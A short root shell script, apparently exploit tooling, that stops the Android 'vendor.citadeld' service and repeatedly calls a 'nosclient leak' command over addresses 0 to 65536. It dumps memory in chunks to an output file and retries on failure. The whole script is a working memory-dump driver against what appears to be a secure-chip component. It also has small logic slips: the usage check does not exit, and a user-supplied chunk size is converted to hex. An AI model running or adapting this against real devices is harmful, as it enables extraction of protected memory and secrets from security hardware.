#!/bin/sh

i=0
sizemax=100

if [ "$EUID" -ne 0 ]
	then echo "Please run as root"
 	exit
fi

# stop citadeld just in case
stop vendor.citadeld

if [ "$#" -lt 1 ]; then
	echo "Usage: $0 <output file> [start index] [chunk size]"
fi

outfile=$1
[[ $# -gt 1 ]] && i=$2
[[ $# -gt 2 ]] && sizemax=`printf '%x\n' ${3}`

while [ ${i} -lt 65536 ];
do
	addr=`printf '%x\n' ${i}`
	#echo -n "${i} "
	timeout 2s ./nosclient leak ${addr} ${sizemax} ${1} > /dev/null
	ret=$?
	if [ $ret -eq 0 ]; then
		i=$((${i} + ${sizemax}))
	else # sometimes it will fail, simply retry in that case

		echo "Failed, retry index ${i}"
	fi
done
